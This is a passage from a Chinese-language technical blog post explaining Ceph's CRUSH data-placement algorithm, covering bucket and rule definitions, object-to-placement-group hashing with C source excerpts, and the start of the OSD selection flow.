，形成一个层次化的结构，这有助于定义数据在集群中的分布方式。 bucket 的设计允许 CRUSH 算法模拟物理存储的层次结构，如机架、行、数据中心等，以及在这些层次上实施数据复制和负载均衡策略。<strong>bucket 的 id 都是小于零的负数。</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># buckets</span><br><span class="hljs-string">host</span> <span class="hljs-string">node01</span> &#123;<br>        <span class="hljs-string">id</span> <span class="hljs-number">-3</span>            <span class="hljs-comment"># do not change unnecessarily</span><br>        <span class="hljs-string">id</span> <span class="hljs-number">-4</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span>  <span class="hljs-comment"># do not change unnecessarily</span><br>        <span class="hljs-comment"># weight 0.19537</span><br>        <span class="hljs-string">alg</span> <span class="hljs-string">straw2</span><br>        <span class="hljs-string">hash</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># rjenkins1</span><br>        <span class="hljs-string">item</span> <span class="hljs-string">osd.0</span> <span class="hljs-string">weight</span> <span class="hljs-number">0.09769</span><br>        <span class="hljs-string">item</span> <span class="hljs-string">osd.1</span> <span class="hljs-string">weight</span> <span class="hljs-number">0.09769</span><br>&#125;<br><br><span class="hljs-string">......</span><br><br><span class="hljs-string">root</span> <span class="hljs-string">default</span> &#123;<br>        <span class="hljs-string">id</span> <span class="hljs-number">-1</span>            <span class="hljs-comment"># do not change unnecessarily</span><br>        <span class="hljs-string">id</span> <span class="hljs-number">-2</span> <span class="hljs-string">class</span> <span class="hljs-string">hdd</span>  <span class="hljs-comment"># do not change unnecessarily</span><br>        <span class="hljs-comment"># weight 0.58612</span><br>        <span class="hljs-string">alg</span> <span class="hljs-string">straw2</span><br>        <span class="hljs-string">hash</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># rjenkins1</span><br>        <span class="hljs-string">item</span> <span class="hljs-string">node01</span> <span class="hljs-string">weight</span> <span class="hljs-number">0.19537</span><br>        <span class="hljs-string">item</span> <span class="hljs-string">node02</span> <span class="hljs-string">weight</span> <span class="hljs-number">0.19537</span><br>        <span class="hljs-string">item</span> <span class="hljs-string">node03</span> <span class="hljs-string">weight</span> <span class="hljs-number">0.19537</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>字段解析:</strong></p><ul><li><code>host/root</code>: bucket 类型。对应于 CRUSH 层次结构中的一个层级，如 host、rack、datacenter 等。</li><li><code>node01/default</code>: bucket 名称。通常反映其在物理或逻辑结构中的角色，如 node01、default 等。</li><li><code>id</code>: bucket id。这个 id 在 CRUSH map 中是唯一的，用于区分不同的 buckets。</li><li><code>alg</code>: bucket 算法。bucket 使用特定的算法来决定如何在其包含的项（ OSDs 或其他 buckets ）之间分配数据。常见的算法包括 uniform&#x2F;list&#x2F;tree&#x2F;straw&#x2F;straw2 。<ul><li><code>uniform</code>: 对应 CRUSH_BUCKET_UNIFORM 。一种简单的分配策略，其中所有子项都具有相同的权重，适用于所有子项具有均等的存储容量和性能的情况。</li><li><code>list</code>: 对应 CRUSH_BUCKET_LIST 。按照列表中的顺序和指定的权重来分配数据，允许管理员精确控制数据分配的顺序，适用于需要按特定顺序优先分配数据的场景。</li><li><code>tree</code>: 对应 CRUSH_BUCKET_TREE 。基于树形结构的数据分配方法，其中数据是按层次结构递归分配的。适用于复杂的层次结构，如多层数据中心的环境，它可以有效地在多个层级上平衡数据分布。</li><li><code>straw</code>: 对应 CRUSH_BUCKET_STRAW 。使用一种称为 straw 算法的方法来分配数据。每个子项被赋予一个 straw ，其长度与子项的权重成比例。选择子项的概率与其 straw 的长度成正比。适用于子项之间权重差异较大的情况。</li><li><code>straw2</code>: 对应 CRUSH_BUCKET_STRAW2 。straw 算法的改进版本，它修正了原始 straw 算法中的一些不平衡问题，提供了更加均匀和公平的数据分配。在各种场景下都能提供更好的负载均衡和数据分散性。</li></ul></li><li><code>hash</code>: hash 函数。用于决定如何在 bucket 的子项之间选择。常见的哈希函数包括 rjenkins1（对应配置参数为 0 ） 。</li><li><code>item</code>: bucket 子项。这些子项可以是 OSDs（Object Storage Daemons）或者是其他的 buckets 。每个条目定义了子项的 ID 、权重以及其他可能的属性。</li></ul><p><strong>部分桶算法的比较:</strong></p><table><thead><tr><th align="center">桶算法</th><th align="center">时间复杂度</th><th align="center">添加</th><th align="center">移除</th></tr></thead><tbody><tr><td align="center">uniform</td><td align="center">O(1)</td><td align="center">差</td><td align="center">差</td></tr><tr><td align="center">list</td><td align="center">O(n)</td><td align="center">优</td><td align="center">差</td></tr><tr><td align="center">straw2</td><td align="center">O(n)</td><td align="center">优</td><td align="center">优</td></tr></tbody></table><h2 id="1-5、Rules"><a href="#1-5、Rules" class="headerlink" title="1.5、Rules"></a>1.5、Rules</h2><p>定义了数据的复制方式。例如，一个规则可能指定一个数据块应该被复制三次，并存储在不同的机架上以确保容错。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># rules</span><br><span class="hljs-string">rule</span> <span class="hljs-string">replicated_rule</span> &#123;<br>        <span class="hljs-string">id</span> <span class="hljs-number">0</span><br>        <span class="hljs-string">type</span> <span class="hljs-string">replicated</span><br>        <span class="hljs-string">step</span> <span class="hljs-string">take</span> <span class="hljs-string">default</span><br>        <span class="hljs-string">step</span> <span class="hljs-string">chooseleaf</span> <span class="hljs-string">firstn</span> <span class="hljs-number">0</span> <span class="hljs-string">type</span> <span class="hljs-string">host</span><br>        <span class="hljs-string">step</span> <span class="hljs-string">emit</span><br>&#125;<br><span class="hljs-comment"># end crush map</span><br></code></pre></td></tr></table></figure><p><strong>字段解析:</strong></p><ul><li><code>rule</code>: rule 标记。</li><li><code>replicated_rule</code>: rule name。自定义的 rule 。</li><li><code>id</code>: rule id。规则的唯一标识符。</li><li><code>type</code>: rule type。可选值为 replicated&#x2F;erasure&#x2F;msr_firstn&#x2F;msr_indep 。<ul><li><code>replicated</code>: 最常用的规则类型，用于创建数据的多个副本。每个数据对象会在多个物理位置存储相同的副本，以提高数据的可用性和耐久性。适用于需要高数据可靠性和快速恢复能力的场景。如果一个存储节点失败，其他节点上的副本可以立即提供数据，无需复杂的恢复过程。</li><li><code>erasure</code>: 使用纠删码技术，将数据分割成多个数据块和校验块。这种方法可以在保持相似的容错能力的同时，比简单复制更有效地使用存储空间。适用于大规模数据存储，特别是当存储成本是一个重要考虑因素时。虽然纠删码提供了高存储效率，但其恢复过程可能比复制更复杂，对性能的影响也较大。</li><li><code>msr_firstn</code>: MSR (Multi-Site Replication) 是一种多站点复制策略，其中 FirstN 指的是在多个站点中选择前 N 个站点进行数据复制。适用于需要跨地理位置进行数据复制的场景，以实现灾难恢复和数据本地化。FirstN策略确保数据被复制到指定数量的最优站点，通常基于位置或其他标准选择。</li><li><code>msr_indep</code>: MSR (Multi-Site Replication) 是一种多站点复制策略，其中 IndeP 指数据在每个站点独立地被复制和管理，而不是选择固定数量的站点。这种模式适用于那些需要在每个站点独立管理数据的场景，允许每个站点根据本地需求和策略来优化数据存储和访问。这种类型的复制可以提高灵活性和数据自治。</li></ul></li><li><code>step</code>: <ul><li><code>take</code>: 指定了 CRUSH 算法开始选择的起点。通常，这个起点是一个 bucket ，例如一个数据中心、机架或服务器组。</li><li><code>chooseleaf</code>: 选择方式。选择存储数据的叶子节点。叶子节点通常是指实际存储数据的设备，如硬盘或SSD。</li><li><code>choose</code>: 选择方式。类似于 chooseleaf ，但不限于选择叶子节点。 choose 可以用于在任何级别的 bucket 中进行选择。该操作允许在非叶子级别进行更复杂的数据分布决策，例如在不同的数据中心或机架之间进行选择。</li><li><code>firstn</code>: 选择模式。指定选择的叶子节点的数量。这个数字可以是具体的数量，也可以是 0 （表示根据复制因子自动确定数量）。常用于需要固定数量副本的场景，如在多个数据中心或机架中复制数据，确保数据的高可用性和冗余。</li><li><code>indep</code>: 选择模式。表示每次选择都是独立的，不受之前选择的影响。这意味着即使多次执行相同的选择操作，也可能得到不同的结果。适用于需要增强随机性和分布均匀性的场景。它有助于避免因选择过程中的依赖关系而导致的数据局部化和热点问题。</li><li><code>type</code>: 指定叶子节点的类型，如 host、rack 等，这决定了数据复制的物理分隔程度。</li><li><code>emit</code>: 标志着选择过程的结束，输出最终确定的存储目标。</li></ul></li></ul><h1 id="二、对象映射规则"><a href="#二、对象映射规则" class="headerlink" title="二、对象映射规则"></a>二、对象映射规则</h1><p><strong>数据对象到 OSD 的映射主要包含两个阶段:</strong></p><ul><li>对象映射到 PG：简单的哈希。</li><li>PG 映射到 OSD 列表：CRUSH 伪随机算法。</li></ul><h2 id="2-1、对象映射到-PG"><a href="#2-1、对象映射到-PG" class="headerlink" title="2.1、对象映射到 PG"></a>2.1、对象映射到 PG</h2><p><strong>概要代码:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 创建对象的定位信息</span><br><span class="hljs-type">object_locator_t</span> <span class="hljs-title function_">oloc</span><span class="hljs-params">(pool, namespacestr)</span>;<br><br><span class="hljs-comment">// 创建对象信息</span><br><span class="hljs-type">object_t</span> <span class="hljs-title function_">oid</span><span class="hljs-params">(objstr)</span>;<br><br><span class="hljs-comment">// 计算对象的原始 pg id 信息</span><br><span class="hljs-type">pg_t</span> pgid = osdmap.object_locator_to_pg(oid, oloc);<br><br><span class="hljs-comment">// 将对象的原始 pg id 信息转换为实际可存储的 pg 信息</span><br><span class="hljs-comment">// 其实是将原始 pg id 映射到 pg_num 的有效范围内</span><br><span class="hljs-type">pg_t</span> mpgid = osdmap.raw_pg_to_pg(pgid);<br></code></pre></td></tr></table></figure><p><strong>计算 pgid 的规则如下:</strong> （注意这里的 hashfunc 为特定 pool 的 hash 类型，目前支持 <code>linux</code> 和 <code>rjenkins</code> 这两种类型，默认为 <code>rjenkins</code>）</p><ul><li>如果 <code>oloc.hash &gt;= 0</code> : 则 <code>pgid = pg_t(oloc.hash, oloc.pool)</code></li><li>如果 <code>oloc.hash &lt; 0 &amp;&amp; oloc.key 非空 &amp;&amp; oloc.nspace 非空</code> : 则 <code>pgid = pg_t(hashfunc(oloc.nspace + &#39;\037&#39; + oloc.key), oloc.pool)</code></li><li>如果 <code>oloc.hash &lt; 0 &amp;&amp; oloc.key 非空 &amp;&amp; oloc.nspace 为空</code> : 则 <code>pgid = pg_t(hashfunc(oloc.key), oloc.pool)</code></li><li>如果 <code>oloc.hash &lt; 0 &amp;&amp; oloc.key 为空 &amp;&amp; oloc.nspace 非空</code> : 则 <code>pgid = pg_t(hashfunc(oloc.nspace + &#39;\037&#39; + oid.name), oloc.pool)</code></li><li>如果 <code>oloc.hash &lt; 0 &amp;&amp; oloc.key 为空 &amp;&amp; oloc.nspace 为空</code> : 则 <code>pgid = pg_t(hashfunc(oid.name), oloc.pool)</code></li></ul><p><img src="/assets/images/ceph-crush-pgid.png" alt="PGID" loading="lazy"></p><p><strong>计算 mpgid 的规则如下:</strong></p><ul><li>规则前提: pg_num_mask 是将 pg_num 向上取到最近的二次幂数值，然后减一得到的（pgp_num 和 pgp_num_mask 关系亦如此）。比如 pg_num&#x3D;16，则 pg_num_mask&#x3D;15； pg_num&#x3D;10，则 pg_num_mask&#x3D;15； </li><li>计算规则:<ul><li>如果 <code>(pgid.m_seed &amp; pg_num_mask) &lt; pg_num</code> ， 则 <code>mpgid.m_seed = pgid.m_seed &amp; pg_num_mask</code></li><li>如果 <code>(pgid.m_seed &amp; pg_num_mask) &gt;= pg_num</code> ， 则 <code>mpgid.m_seed = pgid.m_seed &amp; (pg_num_mask &gt;&gt; 1)</code></li></ul></li><li>参考数值计算示例:</li></ul><table><thead><tr><th align="center">pgid.m_seed</th><th align="center">pg_num</th><th align="center">pg_num_mask</th><th align="center">(pgid.m_seed &amp; pg_num_mask) &lt; pg_num</th><th align="center">mpgid.m_seed</th></tr></thead><tbody><tr><td align="center">7</td><td align="center">10</td><td align="center">15</td><td align="center">Yes</td><td align="center">7 &amp; 15 &#x3D; 7</td></tr><tr><td align="center">12</td><td align="center">10</td><td align="center">15</td><td align="center">No</td><td align="center">12 &amp; (15 &gt;&gt; 1) &#x3D; 4</td></tr><tr><td align="center">133</td><td align="center">16</td><td align="center">15</td><td align="center">Yes</td><td align="center">133 &amp; 15 &#x3D; 5</td></tr></tbody></table><p><strong>对象映射到 PG 的相关代码实现:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">object_t</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> name;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">object_locator_t</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">// You specify either the hash or the key -- not both</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-type">int64_t</span> pool;    <span class="hljs-comment">// pool id</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> key;      <span class="hljs-comment">// key string (if non-empty)</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> nspace;   <span class="hljs-comment">// namespace</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-type">int64_t</span> hash;    <span class="hljs-comment">// hash position (if &gt;= 0)</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pg_t</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> m_pool;<br>    <span class="hljs-type">uint32_t</span> m_seed;<br>&#125;<br><br><span class="hljs-type">pg_t</span> <span class="hljs-title function_">OSDMap::object_locator_to_pg</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">object_t</span>&amp; oid, <span class="hljs-type">const</span> <span class="hljs-type">object_locator_t</span>&amp; loc)</span> <span class="hljs-type">const</span><br>&#123;<br>    <span class="hljs-type">pg_t</span> pg;<br>    <span class="hljs-type">int</span> ret = object_locator_to_pg(oid, loc, pg);<br>    ceph_assert(ret == <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> pg;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">OSDMap::object_locator_to_pg</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">object_t</span>&amp; oid, <span class="hljs-type">const</span> <span class="hljs-type">object_locator_t</span>&amp; loc, <span class="hljs-type">pg_t</span>&amp; pg)</span> <span class="hljs-type">const</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (loc.hash &gt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!get_pg_pool(loc.get_pool())) &#123;<br>            <span class="hljs-keyword">return</span> -ENOENT;<br>        &#125;<br>        pg = <span class="hljs-type">pg_t</span>(loc.hash, loc.get_pool());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map_to_pg(loc.get_pool(), oid.name, loc.key, loc.nspace, &amp;pg);<br>&#125;<br><br><span class="hljs-comment">// mapping</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">OSDMap::map_to_pg</span><span class="hljs-params">(<span class="hljs-type">int64_t</span> poolid, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; name, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; key, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; nspace, <span class="hljs-type">pg_t</span>* pg)</span> <span class="hljs-type">const</span><br>&#123;<br>    <span class="hljs-comment">// calculate ps (placement seed)</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">pg_pool_t</span>* pool = get_pg_pool(poolid);<br>    <span class="hljs-keyword">if</span> (!pool) <span class="hljs-keyword">return</span> -ENOENT;<br>    <span class="hljs-type">ps_t</span> ps;<br>    <span class="hljs-keyword">if</span> (!key.empty())<br>        ps = pool-&gt;hash_key(key, nspace);<br>    <span class="hljs-keyword">else</span><br>        ps = pool-&gt;hash_key(name, nspace);<br>    *pg = <span class="hljs-type">pg_t</span>(ps, poolid);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">pg_t</span> <span class="hljs-title function_">pg_pool_t::raw_pg_to_pg</span><span class="hljs-params">(<span class="hljs-type">pg_t</span> pg)</span> <span class="hljs-type">const</span><br>&#123;<br>    pg.set_ps(ceph_stable_mod(pg.ps(), pg_num, pg_num_mask));<br>    <span class="hljs-keyword">return</span> pg;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ceph_stable_mod</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> bmask)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> ((x &amp; bmask) &lt; b)<br>        <span class="hljs-keyword">return</span> x &amp; bmask;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> x &amp; (bmask &gt;&gt; <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pg_pool_t::calc_pg_masks</span><span class="hljs-params">()</span><br>&#123;<br>    pg_num_mask = (<span class="hljs-number">1</span> &lt;&lt; cbits(pg_num - <span class="hljs-number">1</span>)) - <span class="hljs-number">1</span>;<br>    pgp_num_mask = (<span class="hljs-number">1</span> &lt;&lt; cbits(pgp_num - <span class="hljs-number">1</span>)) - <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-2、PG-映射到-OSD-列表"><a href="#2-2、PG-映射到-OSD-列表" class="headerlink" title="2.2、PG 映射到 OSD 列表"></a>2.2、PG 映射到 OSD 列表</h2><p>根据上一步生成的 pgid 信息，之后利用 CRUSH 伪随机算法，便可以计算出最终映射的 osd 列表。 注意：虽然 rule 存在 replicated 和 erasure 等不同的类型，但是关键的计算 osd 列表的逻辑都是相同的，只是在处理可用 osd 列表的顺序时，逻辑有些不同，具体实现可以参考 <code>OSDMap::_raw_to_up_osds</code> 函数。</p><p><strong>部分关键函数:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">crush_finalize</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>)</span><br><span class="hljs-type">void</span> OSDMap::_<span class="hljs-title function_">pg_to_up_acting_osds</span><span class="hljs-params">(...)</span><br><span class="hljs-type">void</span> OSDMap::_<span class="hljs-title function_">pg_to_raw_osds</span><span class="hljs-params">(...)</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">CrushWrapper::do_rule</span><span class="hljs-params">(...)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">crush_do_rule</span><span class="hljs-params">(...)</span><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">crush_work_size</span><span class="hljs-params">(...)</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">crush_init_workspace</span><span class="hljs-params">(...)</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">crush_msr_do_rule</span><span class="hljs-params">(...)</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">crush_do_rule_no_retry</span><span class="hljs-params">(...)</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">crush_choose_firstn</span><span class="hljs-params">(...)</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">crush_choose_indep</span><span class="hljs-params">(...)</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">crush_bucket_choose</span><span class="hljs-params">(...)</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bucket_uniform_choose</span><span class="hljs-params">(...)</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bucket_list_choose</span><span class="hljs-params">(...)</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bucket_tree_choose</span><span class="hljs-params">(...)</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bucket_straw_choose</span><span class="hljs-params">(...)</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bucket_straw2_choose</span><span class="hljs-params">(...)</span><br></code></pre></td></tr></table></figure><h3 id="2-2-1、数组空间初始化"><a href="#2-2-1、数组空间初始化" class="headerlink" title="2.2.1、数组空间初始化"></a>2.2.1、数组空间初始化</h3><p>当通过 CRUSH 计算出最终的 osd 列表前，我们需要现在准备存储 osd 的空间，该空间对应的是一个 char 数组，对应代码为 <code>char work[crush_work_size(crush, maxout)]</code> 。在计算 osd 列表的时候会传入两个数组变量，一个是 out ，另一个是 out2 ，其中 out 用于存储非叶子节点的 item ，out2 用于存储叶子节点的 item 。</p><p><strong>相关函数如下:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 当所有的 bucket 被添加到 crush map 之后，会调用该函数设置 map-&gt;working_size 的大小</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">crush_finalize</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>)</span><br><br><span class="hljs-comment">// 获取数组长度</span><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">crush_work_size</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>, <span class="hljs-type">int</span> result_max)</span><br><br><span class="hljs-comment">// 初始化数组中 crush_work_bucket 结构体成员变量</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">crush_init_workspace</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> crush_map* m, <span class="hljs-type">void</span>* v)</span><br></code></pre></td></tr></table></figure><p><strong>假设 crush map 的构成信息图如上最开始所示，则其对应的 work 数组空间如下所示:</strong></p><p><img src="/assets/images/ceph-crush-work-format.png" alt="Ceph CRUSH Work Array" loading="lazy"></p><h3 id="2-2-2、获取OSD主流程"><a href="#2-2-2、获取OSD主流程" class="headerlink" title="2.2.2、获取OSD主流程"></a>2.2.2、获取OSD主流程</h3><p><strong>关键函数如下:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> OSDMap::_pg_to_raw_osds(<span class="hljs-type">const</span> <span class="hljs-type">pg_pool_t</span>&amp; pool, <span class="hljs-type">pg_t</span> pg, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;* osds, <span class="hljs-type">ps_t</span>* ppps) <span class="hljs-type">const</span><br>&#123;<br>    <span class="hljs-comment">// placement ps</span><br>    <span class="hljs-type">ps_t</span> pps = pool.raw_pg_to_pps(pg);<br><br>    <span class="hljs-comment">// size: pool 副本数量</span><br>    <span class="hljs-type">unsigned</span> size = pool.get_size();<br><br>    <span class="hljs-comment">// 获取对应 crush role id</span><br>    <span class="hljs-type">int</span> ruleno = pool.get_crush_rule();<br><br>    <span class="hljs-comment">// pps 是后面使用的 x 参数</span><br>    <span class="hljs-keyword">if</span> (ruleno &gt;= <span class="hljs-number">0</span>) crush-&gt;do_rule(ruleno, pps, *osds, size, osd_weight, pg.pool());<br><br>    <span class="hljs-comment">// 移除不存在的 OSDs</span><br>    _remove_nonexistent_osds(pool, *osds);<br><br>    <span class="hljs-keyword">if</span> (ppps) *ppps = pps;<br>&#125;<br><br><span class="hljs-comment">// maxout 对应 pool 设置的副本数量</span><br>template&lt;typename WeightVector&gt;<br><span class="hljs-type">void</span> <span class="hljs-title function_">do_rule</span><span class="hljs-params">(<span class="hljs-type">int</span> rule, <span class="hljs-type">int</span> x, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; out, <span class="hljs-type">int</span> maxout, <span class="hljs-type">const</span> WeightVector&amp; weight, <span class="hljs-type">uint64_t</span> choose_args_index)</span> <span class="hljs-type">const</span><br>&#123;<br>    <span class="hljs-type">int</span> rawout[maxout];<br>    <span class="hljs-type">char</span> work[crush_work_size(crush, maxout)];<br>    crush_init_workspace(crush, work);<br><br>    <span class="hljs-comment">// arg_map 用于 straw2 算法</span><br>    crush_choose_arg_map arg_map = choose_args_get_with_fallback(choose_args_index);<br>    <span class="hljs-type">int</span> numrep = crush_do_rule(crush, rule, x, rawout, maxout, <span class="hljs-built_in">std</span>::data(weight), <span class="hljs-built_in">std</span>::size(weight), work, arg_map.args);<br>    <span class="hljs-keyword">if</span> (numrep &lt; <span class="hljs-number">0</span>) numrep = <span class="hljs-number">0</span>;<br>    out.resize(numrep);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numrep; i++) out[i] = rawout[i];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">crush_do_rule</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> crush_map* <span class="hljs-built_in">map</span>, <span class="hljs-type">int</span> ruleno, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span>* result, <span class="hljs-type">int</span> result_max, <span class="hljs-type">const</span> __u32* weight,</span><br><span class="hljs-params">                  <span class="hljs-type">int</span> weight_max, <span class="hljs-type">void</span>* cwin, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> crush_choose_arg* choose_args)</span><br>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">crush_rule</span>* <span class="hljs-title">rule</span>;</span><br><br>    <span class="hljs-keyword">if</span> ((__u32)ruleno &gt;= <span class="hljs-built_in">map</span>-&gt;max_rules) &#123;<br>        dprintk(<span class="hljs-string">&quot; bad ruleno %d\n&quot;</span>, ruleno);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    rule = <span class="hljs-built_in">map</span>-&gt;rules[ruleno];<br>    <span class="hljs-keyword">if</span> (rule_type_is_msr(rule-&gt;type)) &#123;<br>        <span class="hljs-comment">// 处理 CRUSH_RULE_TYPE_MSR_FIRSTN 和 CRUSH_RULE_TYPE_MSR_INDEP 类型的 rule</span><br>        <span class="hljs-keyword">return</span> crush_msr_do_rule(<span class="hljs-built_in">map</span>, ruleno, x, result, result_max, weight, weight_max, cwin, choose_args);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 处理 CRUSH_RULE_TYPE_REPLICATED 和 CRUSH_RULE_TYPE_ERASURE 类型的 rule</span><br>        <span class="hljs-keyword">return</span> crush_do_rule_no_retry(<span class="hljs-built_in">map</span>, ruleno, x, result, result_max, weight, weight_max, cwin, choose_args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>crush_do_rule_no_retry 函数内部会针对不同的 step 执行不同的操作，详细如下:</strong></p><ul><li><code>CRUSH_RULE_SET_CHOOSE_TRIES</code>: 对应操作为 <code>step set_choose_tries</code> ；</li><li><code>CRUSH_RULE_SET_CHOOSELEAF_TRIES</code>: 对应操作为 <code>step set_choose_local_tries</code> ， 会覆盖 chooseleaf_descend_once 参数， 相关的参数还有 choose_total_tries ；</li><li><code>CRUSH_RULE_SET_CHOOSE_LOCAL_TRIES</code>: 对应操作为 <code>step set_choose_local_tries</code> ，对应配置为 choose_local_tries ；</li><li><code>CRUSH_RULE_SET_CHOOSE_LOCAL_FALLBACK_TRIES</code>: 对应操作为 <code>step set_choose_local_fallback_tries</code> ，对应配置为 choose_local_fallback_tries ；</li><li><code>CRUSH_RULE_SET_CHOOSELEAF_VARY_R</code>: 对应操作为 <code>step set_chooseleaf_vary_r</code>，对应配置为 chooseleaf_vary_r ；</li><li><code>CRUSH_RULE_SET_CHOOSELEAF_STABLE</code>: 对应操作为 <code>step set_chooseleaf_stable</code>， 对应配置为 chooseleaf_stable ；</li><li><code>CRUSH_RULE_TAKE</code>: 对应操作为 <code>step take</code> ；</li><li><code>CRUSH_RULE_CHOOSELEAF_FIRSTN</code>: 对应操作为 <code>step chooseleaf firstn</code> ；</li><li><code>CRUSH_RULE_CHOOSE_FIRSTN</code>: 对应操作为 <code>step choose firstn</code> ；</li><li><code>CRUSH_RULE_CHOOSELEAF_INDEP</code>: 对应操作为 <code>step chooseleaf indep</code> ；</li><li><code>CRUSH_RULE_CHOOSE_INDEP</code>: 对应操作为 <code>step choose indep</code> ；</li><li><code>CRUSH_RULE_EMIT</code>: 对应操作为 <code>step emit</code> ；</li></ul><h3 id="2-2-3、Choose-Firstn-逻辑"><a href="#2-2-3、Choose-Firstn-逻辑" class="headerlink" title="2.2.3、Choose Firstn 逻辑"></a>2.2.3、Choose Firstn 逻辑</h3><p>当 step 操作方式为 <code>chooseleaf firstn</code> 或者 <code>choose firstn</code> 时，会执行到 <code>crush_choose_firstn</code> 函数的处理逻辑中，这种方式意味着会选择前 N 个符合条件的元素。</p><p><strong>示例 rule:</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># rules</span><br><span class="hljs-string">rule</span> <span class="hljs-string">replicated_rule</span> &#123;<br>        <span class="hljs-string">id</span> <span class="hljs-number">0</span><br>        <span class="hljs-string">type</span> <span class="hljs-string">replicated</span><br>        <span class="hljs-string">step</span> <span class="hljs-string">take</span> <span class="hljs-string">default</span><br>        <span class="hljs-string">step</span> <span class="hljs-string">chooseleaf</span> <span class="hljs-string">firstn</span> <span class="hljs-number">0</span> <span class="hljs-string">type</span> <span class="hljs-string">host</span><br>        <span class="hljs-string">step</span> <span 